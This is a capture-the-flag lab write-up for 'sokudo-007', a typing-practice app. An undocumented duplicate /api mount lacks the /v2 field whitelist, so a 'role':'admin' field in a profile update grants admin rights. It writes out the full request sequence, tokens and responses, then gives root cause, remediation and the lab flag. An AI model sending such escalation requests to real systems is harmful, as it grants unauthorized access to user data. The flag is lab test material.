# Bug Report - sokudo-007: Shadow API Mount Bypasses Mass Assignment Guard for Admin Escalation

**Lab:** sokudo-007
**Difficulty:** Easy
**Date:** 2026-07-02
**Severity:** Critical
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
**CVSS:** 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) - a fresh free account is enough, no interaction needed

---

## Summary

Sokudo (a typing practice app) exposes its entire REST API under two separate mount points: `/v2/*`, which is the one the React frontend actually calls, and `/api/*`, an undocumented duplicate mount never referenced anywhere in the frontend bundle. Both mounts share the same database and read handlers, but `PUT /v2/profile` enforces a strict field whitelist (only `full_name`, `bio`, `website`, `keyboard` are writable) while `PUT /api/profile` does not. Sending `role: "admin"` through the shadow mount updates the caller's row directly. Because every authenticated route resolves role fresh from the database on each request rather than trusting a claim in the JWT, the same session token is immediately treated as admin on both mounts, unlocking `/admin/users` and `/admin/sessions`.

---

## Steps to Reproduce

**Step 1 - Register a normal account**

```http
POST /v2/register HTTP/1.1
Host: lab-1782997558595-c3zgx4.labs-app.bugforge.io
Content-Type: application/json

{"username":"apimass_4855","email":"apimass_4855@test.com","password":"Passw0rd123!","full_name":"x"}
```

Response:
```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDIsInVzZXJuYW1lIjoiYXBpbWFzc180ODU1IiwiaWF0IjoxNzgzMDAwOTMyfQ.JHZRahLUykK1hNtgChWDzZ1c-c2IfeovL8QH8W1TXIk","user":{"id":42,"username":"apimass_4855","email":"apimass_4855@test.com","full_name":"x","role":"user","tier":"free"}}
```

**Step 2 - Discover the shadow mount**

The frontend's webpack sourcemap only ever calls `/v2/*`. Fuzzing common bare API prefixes directly against the server (independent of what the bundle references) turns up a second live route table:

```
GET /api/admin/users  -> 401 application/json  (real route)
GET /api/profile      -> 401 application/json  (real route)
GET /api/anything-else -> 200 text/html         (SPA catch-all, fake)
```

**Step 3 - Mass-assign role through the shadow mount**

```http
PUT /api/profile HTTP/1.1
Host: lab-1782997558595-c3zgx4.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDIsInVzZXJuYW1lIjoiYXBpbWFzc180ODU1IiwiaWF0IjoxNzgzMDAwOTMyfQ.JHZRahLUykK1hNtgChWDzZ1c-c2IfeovL8QH8W1TXIk
Content-Type: application/json

{"full_name":"x","bio":"","website":"","keyboard":"","role":"admin"}
```

Response:
```json
{"message":"Profile updated","profile":{"id":42,"username":"apimass_4855","email":"apimass_4855@test.com","full_name":"x","role":"admin","tier":"free","bio":"","website":"","keyboard":"","created_at":"2026-07-02 14:02:12"}}
```

The same token immediately passes the admin gate on either mount, since role is looked up fresh from the database per request:

```http
GET /api/admin/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NDIsInVzZXJuYW1lIjoiYXBpbWFzc180ODU1IiwiaWF0IjoxNzgzMDAwOTMyfQ.JHZRahLUykK1hNtgChWDzZ1c-c2IfeovL8QH8W1TXIk
```

Response:
```json
[{"id":1,"username":"admin","email":"bug{PieujkrrcamFBEgbixlQ7BgdOJfiJ9CS}","full_name":"System Administrator","role":"admin","tier":"pro","created_at":"2026-07-02 13:05:59"}, ...]
```

The flag is planted in the seeded admin account's `email` field, only visible through the admin users listing.

---

## Impact

- Any registered user can grant themselves the admin role with a single request, no privileged account or password guessing required
- Full account takeover of the application's privilege model: escalated token can read every user's PII via `/admin/users` and every recorded typing session via `/admin/sessions`
- Because role is checked by database lookup rather than JWT claim, the escalation is durable across both API mounts and survives token refresh
- The primary, frontend-used mount (`/v2/*`) is correctly hardened; the vulnerability only exists because the duplicate mount was left reachable with weaker validation

---

## Root Cause

The Express app registers the same router twice, at `/v2` and at `/api`. The `/v2` mount's profile update handler destructures only the allowed fields before writing to the database:

```js
const { full_name, bio, website, keyboard } = req.body;
db.run('UPDATE users SET full_name=?, bio=?, website=?, keyboard=? WHERE id=?', ...);
```

The `/api` mount instead appears to spread the full request body (or otherwise pass `role` through) into the update, so a client-supplied `role` value is written verbatim. Since both mounts point at the same table and every subsequent authorization check does `SELECT role FROM users WHERE id = ?` rather than trusting anything from the JWT, the write on one mount is instantly authoritative for both.

---

## Remediation

1. Delete the duplicate `/api` mount entirely, or ensure it is wired to the exact same handler functions as `/v2` rather than a parallel implementation
2. Apply an explicit allow-list (not a deny-list, not a raw body spread) to every write endpoint that touches the `users` table
3. Add an integration test that asserts `role` cannot be changed via any profile-update endpoint under any request shape
4. Route-surface audits should include brute-forcing common API prefix variants (`/api`, `/api/v1`, `/v1`, `/rest`, `/internal`) against the live server, not just what the frontend bundle references

---

## Flag

`bug{PieujkrrcamFBEgbixlQ7BgdOJfiJ9CS}`
